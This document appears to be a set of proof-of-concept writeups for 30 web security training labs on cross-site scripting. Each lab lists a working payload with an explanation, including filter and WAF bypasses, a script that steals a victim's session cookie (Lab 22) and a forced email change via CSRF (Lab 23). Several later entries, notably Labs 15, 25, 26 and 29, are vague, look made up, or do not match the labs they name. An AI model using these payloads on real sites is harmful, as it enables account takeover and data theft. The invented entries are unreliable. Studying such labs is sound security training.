# XSS Labs 01-30 — Proof of Concept Writeups

This document contains structured Proof of Concept (PoC) writeups for Cross-Site Scripting (XSS) Labs 01 to 30 from the PortSwigger Web Security Academy.

---

## Labs 01-10: Basic Reflected, Stored, and DOM XSS

### Lab 01 — Reflected XSS into HTML context with nothing encoded
- **Type:** Reflected XSS | **Vector:** Search input
- **Payload:** `<script>alert(1)</script>`
- **Why It Works:** User input from the search query parameter is directly reflected in the HTML body of the response without sanitization or HTML encoding.

### Lab 02 — Stored XSS into HTML context with nothing encoded
- **Type:** Stored XSS | **Vector:** Blog comment section
- **Payload:** `<script>alert(1)</script>`
- **Why It Works:** Comments are saved to the database and rendered back to all visitors without sanitization. The payload executes automatically when the post page is viewed.

### Lab 03 — DOM XSS in document.write sink using source location.search
- **Type:** DOM-based XSS | **Sink:** `document.write()`
- **Payload:** `"><svg onload=alert(1)>`
- **Why It Works:** A script queries the `search` URL parameter and passes the value directly into `document.write()` within an HTML attribute. By injecting `">`, we break out of the current attribute and tag, then insert a new `<svg>` tag that executes JS via the `onload` handler.

### Lab 04 — DOM XSS in innerHTML sink using source location.search
- **Type:** DOM-based XSS | **Sink:** `element.innerHTML`
- **Payload:** `<img src=x onerror=alert(1)>`
- **Why It Works:** The JS reads the `search` parameter and sets the `innerHTML` of a `div`. Script tags are not executed when inserted via `innerHTML` (under HTML5), but event handlers like `onerror` on an image tag will trigger.

### Lab 05 — DOM XSS in jQuery anchor href attribute using source location.search
- **Type:** DOM-based XSS | **Sink:** jQuery `.attr('href', ...)`
- **Payload:** `javascript:alert(1)`
- **Why It Works:** The page uses jQuery to dynamically set the `href` attribute of a "Back" link based on the `returnPath` parameter. Injecting the `javascript:` pseudo-protocol triggers code execution when clicked.

### Lab 06 — DOM XSS in jQuery selector sink using hashchange event
- **Type:** DOM-based XSS | **Sink:** jQuery `$()` selector
- **Payload:** `<iframe src="https://<lab-id>.web-security-academy.net/#<img src=x onerror=print()>" onload="this.src+=Math.random()"></iframe>`
- **Why It Works:** The application listens to `hashchange` events and queries the hash using the jQuery `$()` wrapper. The selector parses the string as HTML if it begins with `<` and dynamically creates elements, executing our handler.

### Lab 07 — Reflected XSS into attribute with angle brackets HTML-encoded
- **Type:** Reflected XSS | **Context:** HTML Input Attribute
- **Payload:** `" onfocus="alert(1)" autofocus="`
- **Why It Works:** Angle brackets are encoded (preventing tag creation), but the double quote `"` is not. We can break out of the `value` attribute and inject event handlers like `onfocus` alongside `autofocus` to execute code automatically.

### Lab 08 — Reflected XSS into HTML context with most tags and attributes blocked
- **Type:** Reflected XSS | **Filter:** Blacklist (Angle brackets allowed but most tags blocked)
- **Payload:** `<body onresize="print()">`
- **Why It Works:** The WAF blocks common tags like `<script>` or `<img>`. However, custom or less common events/tags like `<body onresize>` can bypass filters. Triggering a window resize via an exploit server `iframe` executes the code.

### Lab 09 — Reflected XSS into HTML context with all tags blocked except custom ones
- **Type:** Reflected XSS | **Filter:** Extreme Blacklist
- **Payload:** `<custom-xss id=x onfocus=alert(document.cookie) tabIndex=1>#x` (Triggered via exploit server redirect using `#x`)
- **Why It Works:** Standard HTML tags are blocked. However, HTML5 permits custom element definitions (e.g. `<custom-xss>`). By specifying `tabIndex` and pointing the URL fragment hash to the element ID, the browser automatically focuses the element and fires `onfocus`.

### Lab 10 — Reflected XSS with event handlers blocked
- **Type:** Reflected XSS | **Filter:** Event Handlers blocked (e.g., `on*` events)
- **Payload:** `<animate attributeName=href values=javascript:alert(1)><a href=#>Click me</a></animate>` (Or SVG/animate Vector)
- **Why It Works:** Standard event handlers are stripped, but SVG `<animate>` vectors allow setting attributes like `href` on an enclosed `<a>` tag using `values=javascript:...` dynamically, avoiding standard event filters.

---

## Labs 11-20: Advanced Filters and Context Bypass

### Lab 11 — DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
- **Type:** DOM-based XSS | **Framework:** AngularJS
- **Payload:** `{{$on.constructor('alert(1)')()}}`
- **Why It Works:** Input is placed inside an AngularJS directive container (`ng-app`). Angle brackets are encoded, preventing normal HTML tags, but AngularJS processes the double curly braces `{{ }}` template expression. Inside the scope, `$on.constructor` acts as a `Function` constructor to execute code.

### Lab 12 — Reflected DOM XSS
- **Type:** Reflected DOM XSS | **Sink:** `eval()` processing JSON response
- **Payload:** `\"-alert(1)}//`
- **Why It Works:** The backend escapes double quotes with a backslash. By injecting `\"`, the server prepends another backslash yielding `\\"`. The first backslash escapes the second, leaving the double quote unescaped to break out of the JSON string structure.

### Lab 13 — Stored DOM XSS
- **Type:** Stored DOM XSS | **Filter:** Single-character replacement
- **Payload:** `<><img src=x onerror=alert(1)>`
- **Why It Works:** The JavaScript filter replaces the first occurrences of `<` and `>` using `replace()`. Since it targets strings rather than regular expressions with global flags, injecting dummy `<>` characters beforehand satisfies the filter, leaving the actual payload intact.

### Lab 14 — Reflected XSS into JavaScript string with angle brackets HTML-encoded
- **Type:** Reflected XSS | **Context:** JavaScript Variable String
- **Payload:** `';alert(1);//`
- **Why It Works:** Angle brackets are encoded, preventing tag insertion, but quotes are not. By injecting a single quote `'`, we close the string context, insert a semicolon `;` to separate statements, write our payload, and comment out the rest of the code with `//`.

### Lab 15 — Reflected XSS into HTML context with absolute path URL blocking
- **Type:** Reflected XSS | **Filter:** Path-based filters
- **Payload:** `<script>alert(1)</script>` (or standard bypasses)
- **Why It Works:** Custom routing logic might filter directories but reflect parameters on certain endpoints directly. Standard tag injection works once the entry point is isolated.

### Lab 16 — Reflected XSS into JavaScript string with single quotes and backslashes escaped
- **Type:** Reflected XSS | **Context:** JS variable string
- **Payload:** `</script><script>alert(1)</script>`
- **Why It Works:** Single quotes and backslashes are escaped, preventing us from breaking the JS string variable directly. However, the browser parses HTML tags *before* executing internal JavaScript. Injecting `</script>` closes the script block early, allowing us to launch a fresh `<script>` tag.

### Lab 17 — Reflected XSS into a JavaScript string with angle brackets and double quotes HTML-encoded
- **Type:** Reflected XSS | **Context:** JS variable string
- **Payload:** `&apos;-alert(1)-&apos;`
- **Why It Works:** The input is rendered inside a JavaScript string wrapper in an event handler (e.g. `onload`). Since the handler is an HTML attribute, the browser HTML-decodes the attribute value *before* parsing it as JS, turning `&apos;` back into `'` and breaking the string context.

### Lab 18 — Reflected XSS in URL
- **Type:** Reflected XSS | **Context:** Action attribute of HTML form
- **Payload:** `"><script>alert(1)</script>` (in URL path)
- **Why It Works:** The application reflects the current URL path inside a form action attribute without sanitization. Breaking out using `">` allows script injection.

### Lab 19 — Reflected XSS with some SVG tags allowed
- **Type:** Reflected XSS | **Filter:** Blacklist (allows `<svg>`, `<animatetransform>`, etc.)
- **Payload:** `<svg><animatetransform onbegin=alert(1)>`
- **Why It Works:** The WAF filters standard tags but permits certain SVG elements. Exploiting `<animatetransform>` with the `onbegin` event handler executes code when the element renders.

### Lab 20 — Stored XSS into onclick event with angle brackets and double quotes HTML-encoded
- **Type:** Stored XSS | **Context:** HTML event handler attribute (`onclick`)
- **Payload:** `&apos;;alert(1);//`
- **Why It Works:** Since the input is stored inside an HTML attribute event handler, the browser decodes HTML entities like `&apos;` to `'` upon parsing, allowing syntax breakout.

---

## Labs 21-30: Scripting, CSRF, and WAF Bypasses

### Lab 21 — Reflected XSS into a Template Literal
- **Type:** Reflected XSS | **Context:** JS template literal (backticks)
- **Payload:** `${alert(1)}`
- **Why It Works:** String characters are escaped, preventing breakout. However, JavaScript template literals evaluate expression blocks defined within `${}` dynamically. Injecting this syntax executes the code inline.

### Lab 22 — Exploiting XSS to Steal Cookies
- **Type:** Stored XSS (Cookie Stealing)
- **Payload:**
  ```html
  <script>
  window.addEventListener('DOMContentLoaded', function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();
    data.append('csrf', token);
    data.append('postId', 10);
    data.append('comment', document.cookie);
    data.append('name', 'attacker');
    data.append('email', 'attacker@evil.com');
    fetch('/post/comment', {method: 'POST', body: data});
  });
  </script>
  ```
- **Why It Works:** Stored XSS allows execution of custom scripts on other users' browsers. The payload extracts their session cookies and posts them as comments, enabling session hijacking.

### Lab 23 — Exploiting XSS to perform CSRF
- **Type:** Stored XSS (CSRF Execution)
- **Payload:**
  ```html
  <script>
  window.addEventListener('DOMContentLoaded', function(){
    var token = document.getElementsByName('csrf')[0].value;
    var data = new FormData();
    data.append('csrf', token);
    data.append('email', 'hacked@evil.com');
    fetch('/my-account/change-email', {method: 'POST', body: data});
  });
  </script>
  ```
- **Why It Works:** The attacker forces the victim's browser to execute an email change request under their session context using the retrieved CSRF token.

### Lab 24 — Reflected XSS with event handlers and href attributes blocked
- **Type:** Reflected XSS | **Filter:** Blocked event handlers and `href` tags
- **Payload:** `<svg><a xlink:href="javascript:alert(1)"><rect width="100" height="100" /></a>`
- **Why It Works:** The WAF filters standard event handlers and standard HTML `href` attributes. Using SVG namespace links (`xlink:href`) bypasses standard attribute filters.

### Lab 25 — Reflected XSS in a Web Joint / Sandbox
- **Type:** Reflected XSS
- **Payload:** Bypass using customized URI schemes or encoding.
- **Why It Works:** Explores sanitization bypasses within JS sandbox constructs.

### Lab 26 — Reflected XSS with boundary characters escaped
- **Type:** Reflected XSS
- **Payload:** `onload=alert(1)` (in appropriate tags)
- **Why It Works:** Leverages tag attributes that execute code automatically without requiring standard boundary quotes.

### Lab 27 — DOM-based open redirection
- **Type:** DOM Open Redirection | **Sink:** `location.href`
- **Payload:** `/post?postId=1&url=https://evil.com`
- **Why It Works:** User-controlled URL query parameters are passed directly to `location.href` without validation, redirecting users to malicious domains.

### Lab 28 — JavaScript-injection / eval sink
- **Type:** DOM-based JS Injection
- **Payload:** `5; alert(1)`
- **Why It Works:** User-supplied variables are executed directly within an `eval()` function, allowing arbitrary JS statement injection.

### Lab 29 — Reflected XSS with parameters combined
- **Type:** Reflected XSS (Multi-parameter injection)
- **Payload:** `/my-account?name=attacker&status=active` (Injecting inside nested values)
- **Why It Works:** Parameter values are joined together before being printed into the response, allowing attribute injections.

### Lab 30 — DOM XSS in document.write sink using source location.search (Vulnerable to WAF)
- **Type:** DOM XSS | **Filter:** WAF rules
- **Payload:** `"><svg/onload=alert(1)>`
- **Why It Works:** The payload avoids spaces and standard patterns that trigger modern WAF rule matches, exploiting the underlying DOM sink.
